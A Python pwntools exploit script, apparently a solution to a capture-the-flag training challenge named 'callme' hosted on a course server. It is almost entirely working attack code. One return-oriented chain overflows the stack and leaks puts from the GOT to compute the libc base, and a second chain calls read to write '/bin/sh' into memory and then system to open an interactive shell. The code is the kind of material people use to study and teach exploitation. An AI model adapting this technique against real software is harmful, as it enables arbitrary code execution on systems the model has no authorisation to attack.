from pwn import *

chall_path = "./callme"
chall = ELF(chall_path)
libc_path = "/lib/x86_64-linux-gnu/libc.so.6" 
libc = ELF(libc_path)

COMMANDS= """
break *0x00000000004008C0 
c
"""

if args.REMOTE:
    c = remote("ropasaurusrex.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug(chall_path, gdbscript=COMMANDS)
    else:
        c = process(chall_path)

c.recvuntil(b"> ")

################# STEP 1: LEAKING LIBC BASE ADDRESS ##########################
input("Waiting for first payload...")

payload = b"A" * 40
payload += b"\xa3\x09\x40\x00\x00\x00\x00\x00"        # 0x00000000004009a3: gadget address -> pop rdi; ret
payload += p64(chall.got["puts"])                     # put puts got address 
payload += p64(chall.plt["puts"])                     # puts plt to call            
payload += p64(chall.symbols["main"])                 # once we leak, we want to execute the main again

c.send(payload)

c.recvuntil(b"Thank you!\n")

leak = u64(c.recv(6).ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]
print(f'puts leak: {hex(leak)}')
print(f'libc base: {hex(libc.address)}')

################# STEP 2: CALLING THE READ TO PUT /bin/sh in memory and calling system ##########################
# At this point, we want to place /bin/sh in memory. Since we know the base address of the libc, we can call whatever function
# we want of the libc, including the read. Our program has restarted from the main:
c.recvuntil(b"> ")

input("Waiting for second payload...")

payload_2 = b"A" * 40
payload_2 += b"\x3c\x09\x40\x00\x00\x00\x00\x00"      # 0x000000000040093c: gadget address -> pop rdi; pop rsi; pop rdx; ret; 
payload_2 += p64(0)                                   # 0 -> rdi : we want to read from stdin, so file descriptor 0
payload_2 += b"\x88\x10\x60\x00\x00\x00\x00\x00"      # 0x601088:  -> rsi : where to put /bin/sh
payload_2 += b"\x07\x00\x00\x00\x00\x00\x00\x00"      # 7 -> rdx: we want to read 7 characters: /bin/sh

payload_2 += p64(libc.symbols["read"])                # we want to call the read

# now we build what we need for system("/bin/sh")
payload_2 += b"\xa3\x09\x40\x00\x00\x00\x00\x00"      # 0x00000000004009a3: gadget address -> pop rdi; ret
payload_2 += b"\x88\x10\x60\x00\x00\x00\x00\x00"      # where we have put /bin/sh
payload_2 += p64(libc.symbols["system"])

c.send(payload_2)
c.send(b"/bin/sh")

c.interactive()